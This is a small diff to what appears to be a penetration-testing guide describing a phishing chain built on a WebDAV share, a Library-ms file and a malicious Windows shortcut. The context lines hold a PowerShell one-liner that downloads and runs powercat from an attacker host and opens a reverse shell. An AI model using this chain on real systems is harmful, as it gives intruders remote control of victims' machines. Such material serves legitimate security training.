@@ -222,6 +222,8 @@ $ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/we
 </libraryDescription>
 ```
 
+Put the `config.Library-ms` file in the `webdav` folder.
+
 ### Shortcut File
 
 Right-click on Windows to create a new `shortcut file`.
@@ -230,7 +232,7 @@ Right-click on Windows to create a new `shortcut file`.
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
 ```
 
-Put the `shortcut file` into the webdav folder.
+Put the `shortcut file (*.lnk)` into the `webdav` folder.
 
 ### Send Phishing Email
 
